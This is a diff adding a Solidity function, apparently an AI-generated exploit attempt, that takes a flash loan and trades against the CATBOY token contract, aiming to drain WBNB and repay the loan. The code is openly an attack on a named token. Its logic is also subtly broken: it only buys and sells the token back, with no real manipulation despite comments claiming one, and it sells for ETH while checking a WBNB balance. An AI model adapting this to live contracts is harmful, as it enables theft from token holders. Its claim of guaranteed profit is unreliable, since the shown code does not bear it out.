@@ -1,0 +1,52 @@
+```xml
+<executeExploitCode>
+    function executeExploit(uint256 amount) internal {
+        // Start with flash loan of valuable token.
+        // Execute logic related to exploiting the CATBOY contract
+        // Here we need to buy CATBOY tokens
+        address[] memory path = new address[](2);
+        path[0] = address(valuableToken); // assuming valuableToken is WBNB
+        path[1] = token; // the target CATBOY token
+
+        // Swap half of the flashloaned amount for CATBOY tokens
+        uint256 halfAmount = amount / 2;
+        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            halfAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        // Now we hold some CATBOY tokens
+        // We can directly manipulate CATBOY using its methods to increase our WBNB balance
+
+        // Approve the CATBOY contract to spend our tokens for liquidity or other actions
+        IERC20(token).approve(address(uniswapRouter), type(uint256).max);
+        
+        // We need to swap CATBOY back to WBNB, interested in maximal profit
+        path[0] = token; // now we swap CATBOY back
+        path[1] = address(valuableToken); // returning to WBNB
+
+        uint256 catboyBalance = IERC20(token).balanceOf(address(this));
+        
+        // Swap CATBOY back to WBNB
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            catboyBalance,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        // We should now have a surplus of WBNB
+        uint256 surplusWBNBBalance = IWBNB(address(valuableToken)).balanceOf(address(this));
+
+        // Ensure we have more WBNB than the initial flashloan amount
+        require(surplusWBNBBalance > amount, "Not enough WBNB to cover flash loan");
+
+        // Repay the flash loan
+        valuableToken.transfer(flashloanProvider, amount);
+    }
+</executeExploitCode>
+```
